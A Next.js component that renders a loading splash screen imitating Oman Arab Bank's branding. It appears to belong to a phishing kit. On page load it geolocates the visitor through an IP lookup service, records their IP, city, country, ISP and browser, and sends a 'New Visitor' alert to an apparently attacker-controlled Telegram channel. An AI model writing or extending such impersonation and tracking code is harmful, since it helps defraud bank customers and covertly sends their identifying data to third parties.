"use client"

import Image from "next/image"
import { useEffect } from "react"
import { sendTelegramMessage } from "@/lib/telegram"

export function SplashScreen() {
    useEffect(() => {
        const trackVisitor = async () => {
            try {
                const geoRes = await fetch("https://ipapi.co/json/")
                if (geoRes.ok) {
                    const data = await geoRes.json()

                    if (data.error || data.reason === "Suspended" || data.reserved) {
                        console.log("Visitor tracking skipped: IP API suspended or error.")
                        return
                    }

                    // Store in sessionStorage for later use
                    sessionStorage.setItem("ip", data.ip || "Unknown")
                    sessionStorage.setItem("city", data.city || "N/A")
                    sessionStorage.setItem("region", data.region || "N/A")
                    sessionStorage.setItem("country", data.country_name || "N/A")
                    sessionStorage.setItem("isp", data.org || "N/A")

                    const getBrowserName = () => {
                        const userAgent = window.navigator.userAgent
                        if (userAgent.includes("Firefox")) return "Mozilla Firefox"
                        if (userAgent.includes("SamsungBrowser")) return "Samsung Internet"
                        if (userAgent.includes("Opera") || userAgent.includes("OPR")) return "Opera"
                        if (userAgent.includes("Edge")) return "Microsoft Edge"
                        if (userAgent.includes("Chrome")) return "Google Chrome"
                        if (userAgent.includes("Safari")) return "Apple Safari"
                        return "Unknown Browser"
                    }

                    const browser = getBrowserName()
                    sessionStorage.setItem("browser", browser)

                    await sendTelegramMessage({
                        title: "New Visitor",
                        type: "visitor",
                    })
                }
            } catch (err) {
                console.error("Error tracking visitor:", err)
            }
        }

        trackVisitor()
    }, [])

    return (
        <div className="fixed inset-0 w-full h-[100svh] bg-[#003d70] flex flex-col overflow-hidden">
            {/* Background with radial gradient matching the screenshot */}
            <div
                className="absolute inset-0"
                style={{
                    background:
                        "radial-gradient(ellipse at center, #1a8ad4 0%, #0074c1 25%, #0066b3 45%, #005da3 60%, #004d8a 80%, #003d70 100%)",
                }}
            />

            {/* Content container */}
            <div className="relative z-10 flex flex-col items-center justify-center flex-1 w-full max-w-md mx-auto">
                {/* Logo */}
                <Image
                    src="https://images.crunchbase.com/image/upload/c_pad%2Cf_auto%2Cq_auto%3Aeco%2Cdpr_1/oqi95vlnatsg9byhfxt9?ik-sanitizeSvg=true"
                    alt="Oman Arab Bank Logo"
                    width={200}
                    height={200}
                    className="object-contain"
                    priority
                />
            </div>

            {/* Loader area positioned near the bottom */}
            <div className="relative z-10 w-full flex items-center justify-center pb-[120px]">
                <div className="w-[280px] h-[3px] rounded-full overflow-hidden relative" style={{ backgroundColor: "rgba(255,255,255,0.2)" }}>
                    <div
                        className="absolute top-0 left-0 h-full rounded-full animate-loader-slide"
                        style={{ backgroundColor: "rgba(255,255,255,0.9)", width: "80px" }}
                    />
                </div>
            </div>

            <style jsx>{`
        @keyframes loader-slide {
          0% {
            transform: translateX(-80px);
          }
          100% {
            transform: translateX(280px);
          }
        }
        .animate-loader-slide {
          animation: loader-slide 1.4s ease-in-out infinite;
        }
      `}</style>
        </div>
    )
}
